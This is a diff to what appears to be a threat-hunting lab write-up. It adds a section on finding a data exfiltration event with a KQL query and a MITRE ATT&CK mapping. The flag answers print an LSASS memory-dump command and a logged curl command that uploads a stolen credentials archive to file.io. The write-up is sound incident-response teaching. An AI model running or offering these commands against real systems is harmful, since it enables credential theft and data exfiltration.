@@ -1520,4 +1520,101 @@ In a real environment, this would trigger immediate incident escalation.
 | Credential Access  | OS Credential Dumping: LSASS Memory | **T1003.001** |
 
 ### Final Flag Answer
-` pd -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp `
+`"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp `
+
+---
+
+## FLAG 16 — EXFILTRATION: Upload Command
+
+### Objective
+
+Identify the full command line used to upload the stolen data archive to an external cloud service.
+
+🔍 Investigation Approach
+
+After creating:
+
+- `credentials.tar.gz` (Flag 13)
+- `lsass.dmp` with harvested credentials (Flag 15)
+
+…the attacker needed to transfer the data outside the corporate network.
+
+We searched:
+
+- `DeviceProcessEvents`
+- For known outbound HTTP-capable LOLbins
+
+Prime candidate: `curl.exe`
+
+We filtered for:
+
+- `-F` (form upload)
+- `@` prefix (file attachment)
+- HTTPS remote host
+- CBS staging directory path
+
+### Query Used
+
+(clear and concise format for reporting)
+```
+DeviceProcessEvents
+| where DeviceName == "azuki-fileserver01"
+| where FileName =~ "curl.exe"
+| project Timestamp, DeviceName, AccountName, ProcessCommandLine
+| order by Timestamp asc
+```
+### Evidence Observed
+
+The following command was executed to upload the compressed archive:
+
+<img width="482" height="87" alt="image" src="https://github.com/user-attachments/assets/fbe63bde-7f6a-4ec9-bbcb-2fc6aec375d5" />
+
+
+```
+Nov 22, 2025 2:06:08 AM
+Device: azuki-fileserver01
+Account: fileadmin
+Command:
+"curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io
+```
+This behavior confirms Exfiltration to a cloud storage provider.
+
+### Analysis & Interpretation
+
+This event shows:
+
+- Use of HTTPS to encrypt contents in transit
+- A free, anonymous, disposable hosting service (`file.io`)
+- Use of form-based file upload to mimic legitimate traffic
+- Clear indicator of data exfil completed
+
+Once data reaches file.io:
+
+- Files are available to attacker from anywhere globally
+- The org loses immediate control of stolen data
+
+### Why This Matters
+
+This is the breach objective:
+
+- Confidential data & credentials left the environment
+- Regulatory, financial, and business harm are now realized
+- Attack escalation from reconnaissance → impact
+
+Detection here is critical for timely incident response.
+
+### MITRE ATT&CK Mapping
+
+| Technique Category            | Technique                     | ID                     |
+| ----------------------------- | ----------------------------- | ---------------------- |
+| Exfiltration                  | Exfiltration Over Web Service | **T1567**              |
+| Credential Access → Follow-up | Transfer of Stolen Secrets    | **(related to T1003)** |
+
+
+### Final Flag Answer
+
+`"curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io`
+
+---
+
+## 
